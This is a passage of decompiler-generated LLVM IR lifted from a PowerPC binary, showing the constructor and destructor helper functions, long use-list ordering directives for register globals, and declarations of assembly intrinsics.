1331, 1332, 1333, 1139, 1138, 1137, 1136, 429, 428, 1334, 842, 843, 1141, 1140, 1335, 459, 1341, 1143, 1142, 844, 1343, 653, 717, 1342, 845, 846, 847, 1149, 1148, 1147, 1146, 1145, 1144, 1345, 1346, 1150, 735, 1347, 9, 1348, 1151, 743, 1479, 1480, 742, 1481, 1482, 744, 745, 1483, 1484, 746, 747, 1485, 1486, 748, 749, 1487, 1488, 750, 751, 1489, 1490, 752, 753, 1491, 1492, 754, 755, 1493, 1494, 1153, 1152, 478, 861, 862 }
  uselistorder label %dec_label_pc_10015938, { 1, 0 }
}

define i32 @call___do_global_ctors_aux() local_unnamed_addr {
entry:
  %v0_10015978 = load i32, i32* @r3, align 4
  ret i32 %v0_10015978

; uselistorder directives
  uselistorder i32* @r3, { 49, 50, 366, 367, 370, 368, 369, 0, 179, 121, 122, 180, 182, 183, 185, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 184, 128, 181, 371, 372, 20, 461, 462, 463, 373, 21, 374, 155, 156, 157, 375, 376, 377, 169, 170, 51, 186, 502, 503, 504, 465, 171, 172, 52, 466, 470, 53, 54, 114, 378, 55, 22, 296, 297, 23, 158, 159, 160, 3, 430, 458, 459, 460, 56, 471, 472, 161, 506, 507, 162, 57, 518, 520, 200, 201, 379, 384, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 24, 411, 412, 413, 414, 415, 416, 129, 130, 58, 467, 468, 59, 173, 174, 175, 176, 60, 163, 164, 165, 166, 167, 168, 61, 475, 476, 477, 478, 479, 473, 474, 177, 178, 187, 521, 188, 189, 190, 62, 469, 191, 63, 192, 193, 194, 64, 480, 481, 482, 483, 65, 195, 196, 197, 66, 484, 131, 132, 133, 134, 485, 486, 500, 501, 67, 198, 199, 522, 298, 299, 25, 300, 301, 302, 68, 487, 488, 489, 490, 491, 26, 417, 107, 69, 492, 493, 494, 495, 496, 431, 432, 4, 2, 433, 434, 435, 70, 505, 539, 540, 541, 542, 543, 544, 545, 120, 595, 5, 71, 6, 105, 324, 326, 327, 119, 580, 112, 303, 304, 305, 306, 307, 308, 309, 202, 203, 204, 352, 508, 509, 116, 510, 511, 44, 89, 45, 551, 555, 556, 527, 523, 524, 525, 526, 581, 519, 325, 292, 512, 513, 464, 418, 419, 420, 421, 422, 423, 424, 72, 73, 74, 75, 592, 593, 7, 436, 437, 438, 439, 497, 76, 594, 498, 77, 388, 389, 390, 391, 78, 385, 386, 387, 499, 392, 310, 440, 96, 441, 442, 443, 8, 12, 9, 444, 10, 445, 11, 446, 447, 448, 449, 450, 451, 97, 452, 453, 454, 455, 456, 457, 135, 546, 547, 548, 549, 550, 393, 394, 395, 396, 397, 398, 425, 426, 427, 380, 381, 382, 383, 311, 312, 279, 106, 280, 47, 79, 583, 584, 27, 585, 557, 558, 13, 559, 560, 234, 235, 588, 589, 552, 561, 562, 563, 205, 206, 207, 208, 210, 209, 28, 211, 212, 213, 214, 215, 515, 516, 517, 514, 80, 216, 217, 218, 219, 81, 220, 221, 222, 223, 224, 225, 226, 82, 136, 137, 83, 227, 29, 228, 231, 84, 232, 85, 229, 230, 14, 86, 88, 233, 236, 237, 138, 530, 531, 590, 591, 358, 16, 553, 15, 554, 238, 239, 123, 124, 108, 125, 126, 127, 240, 246, 247, 248, 241, 242, 31, 243, 30, 244, 245, 139, 140, 141, 17, 249, 250, 251, 252, 253, 254, 101, 564, 565, 566, 567, 570, 571, 572, 573, 574, 575, 576, 117, 577, 578, 568, 569, 90, 91, 92, 255, 256, 48, 142, 143, 93, 532, 533, 1, 534, 535, 536, 257, 258, 259, 260, 261, 262, 263, 264, 528, 529, 94, 537, 538, 18, 95, 118, 104, 579, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 98, 109, 87, 144, 110, 111, 278, 99, 281, 282, 283, 113, 284, 285, 286, 287, 288, 289, 290, 359, 291, 586, 587, 582, 293, 100, 294, 295, 46, 360, 361, 362, 363, 19, 32, 313, 314, 315, 33, 316, 34, 317, 318, 319, 320, 321, 322, 323, 328, 329, 330, 331, 38, 37, 332, 333, 334, 335, 36, 35, 336, 337, 338, 339, 340, 341, 43, 342, 42, 343, 344, 41, 345, 346, 40, 347, 39, 348, 349, 350, 351, 353, 354, 355, 357, 356, 364, 365, 428, 429, 102, 103, 115 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  store i32 268523916, i32* @lr, align 4
  %v0_10015988 = call i32 @__do_global_dtors_aux()
  ret i32 %v0_10015988

; uselistorder directives
  uselistorder i32 0, {}
  uselistorder i32* @lr, { 124, 674, 675, 676, 677, 678, 184, 190, 191, 185, 12, 13, 186, 189, 125, 126, 127, 128, 129, 130, 131, 187, 188, 132, 133, 30, 31, 679, 905, 680, 200, 681, 685, 682, 683, 684, 689, 690, 686, 687, 688, 691, 692, 693, 694, 695, 134, 135, 136, 139, 137, 138, 696, 699, 697, 1, 698, 0, 700, 703, 704, 701, 702, 147, 148, 149, 150, 151, 201, 192, 193, 194, 984, 992, 985, 986, 987, 988, 989, 991, 907, 908, 909, 910, 152, 153, 154, 160, 161, 911, 921, 922, 923, 32, 705, 706, 707, 708, 709, 710, 711, 712, 501, 865, 902, 903, 904, 925, 926, 713, 714, 715, 716, 927, 928, 929, 930, 931, 932, 140, 995, 996, 1007, 1008, 141, 1015, 1016, 1017, 1023, 1024, 1025, 1026, 244, 717, 718, 729, 756, 730, 731, 732, 757, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 792, 793, 795, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 33, 34, 912, 913, 914, 915, 916, 917, 142, 155, 156, 157, 158, 159, 214, 143, 144, 145, 146, 162, 163, 164, 165, 166, 167, 169, 168, 170, 171, 172, 173, 174, 178, 175, 176, 177, 180, 179, 9, 181, 182, 183, 195, 196, 197, 198, 1033, 1032, 10, 1027, 1028, 1029, 1031, 199, 202, 203, 204, 205, 206, 207, 208, 1030, 209, 210, 211, 212, 213, 918, 919, 920, 215, 216, 217, 218, 219, 220, 221, 222, 223, 933, 934, 935, 936, 937, 938, 224, 225, 226, 227, 228, 229, 939, 940, 941, 942, 943, 944, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 230, 945, 946, 947, 949, 950, 951, 952, 953, 954, 955, 956, 978, 980, 981, 982, 983, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 1034, 1072, 502, 503, 504, 505, 957, 958, 959, 1073, 960, 961, 733, 734, 749, 750, 751, 866, 867, 962, 963, 964, 965, 966, 967, 968, 969, 970, 971, 1074, 1075, 868, 869, 1076, 1077, 245, 993, 994, 1078, 1079, 1080, 1081, 1082, 1083, 1084, 1085, 1086, 241, 979, 242, 243, 1046, 1071, 1166, 1167, 1171, 1172, 1173, 1174, 1175, 1191, 1193, 1195, 1188, 1189, 1190, 1168, 1170, 550, 551, 552, 553, 554, 555, 556, 246, 1087, 1088, 1095, 1096, 1151, 1165, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 506, 268, 507, 508, 509, 265, 266, 267, 269, 270, 271, 638, 639, 1097, 1099, 1098, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1100, 1101, 1102, 1118, 1119, 1120, 1121, 1122, 1035, 1045, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 1043, 1044, 484, 359, 485, 1009, 1010, 1011, 1012, 990, 948, 585, 272, 794, 273, 274, 791, 618, 796, 906, 619, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 831, 832, 833, 834, 835, 1176, 1177, 1178, 1179, 1180, 1183, 1184, 1185, 870, 871, 872, 873, 829, 830, 1194, 1192, 972, 973, 974, 752, 735, 741, 742, 743, 744, 745, 746, 747, 748, 736, 737, 738, 739, 740, 975, 976, 977, 753, 754, 755, 510, 511, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 47, 48, 888, 1089, 1090, 1091, 1092, 1093, 1094, 1186, 1187, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 839, 840, 512, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 846, 275, 340, 924, 513, 514, 515, 516, 517, 1169, 486, 1181, 1182, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 1154, 1155, 1123, 1124, 345, 346, 347, 348, 349, 350, 351, 1160, 1159, 1103, 1104, 1112, 1114, 1115, 1153, 1111, 1109, 1110, 1113, 1125, 1126, 1127, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 49, 304, 305, 306, 307, 308, 1022, 1018, 1019, 1020, 1021, 1013, 1014, 50, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 51, 52, 328, 330, 331, 11, 332, 335, 336, 337, 329, 338, 339, 333, 334, 341, 342, 343, 344, 352, 353, 354, 355, 53, 54, 55, 1050, 1051, 1052, 1053, 1054, 1069, 1070, 1161, 1162, 1163, 1164, 1116, 1117, 356, 357, 358, 360, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 362, 373, 361, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 372, 363, 365, 2, 364, 366, 367, 368, 369, 370, 371, 56, 57, 58, 59, 60, 61, 62, 63, 374, 385, 427, 428, 386, 3, 387, 388, 389, 390, 391, 392, 393, 1128, 4, 1129, 1130, 1131, 1132, 1133, 1134, 1137, 1138, 1139, 1140, 1141, 1143, 1144, 5, 1145, 1146, 1147, 1148, 1150, 1142, 1135, 1136, 394, 395, 396, 64, 65, 1055, 1057, 1058, 1059, 1061, 6, 1062, 1063, 1064, 1065, 1068, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 1060, 1047, 1048, 1049, 1056, 1066, 1067, 412, 1149, 413, 414, 415, 416, 417, 418, 419, 1105, 420, 421, 422, 423, 424, 425, 426, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 66, 67, 68, 69, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 474, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 475, 476, 477, 478, 479, 483, 653, 654, 655, 656, 480, 481, 482, 7, 1156, 1157, 1158, 1152, 487, 488, 489, 490, 491, 492, 493, 620, 621, 622, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 1106, 1107, 1108, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 518, 519, 520, 841, 842, 843, 623, 624, 625, 602, 603, 604, 626, 627, 628, 115, 116, 117, 118, 119, 120, 605, 606, 607, 121, 122, 123, 586, 587, 588, 494, 495, 496, 498, 499, 500, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 497, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 545, 544, 546, 547, 548, 549, 557, 563, 558, 559, 560, 561, 562, 8, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 629, 630, 631, 632, 633, 634, 635, 636, 637, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 671, 672, 673, 836, 837, 838, 844, 845, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864 }
}

declare i32 @__asm_rlwinm(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwinm.(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwimi(i32, i32, i32, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #0

declare i32 @__asm_mfcr() local_unnamed_addr

declare %0 @__asm_mtcrf(i32, i32) local_unnamed_addr

declare %1 @__asm_cror(i32, i32, i32) local_unnamed_addr

declare %3 @__asm_mcrf_cr0_write(i4) local_unnamed_addr

declare %2 @__asm_crandc(i32, i32, i32) local_unnamed_addr

declare i32 @unknown_0() local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i8 @__decompiler_undefined_function_2() local_unnamed_addr

declare i16 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8** @__decompiler_undefined_function_4() local_unnamed_addr

declare i16* @__decompiler_undefined_function_5() local_unnamed_addr

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #1

attributes #0 = { nounwind readnone }
attributes #1 = { noreturn nounwind }
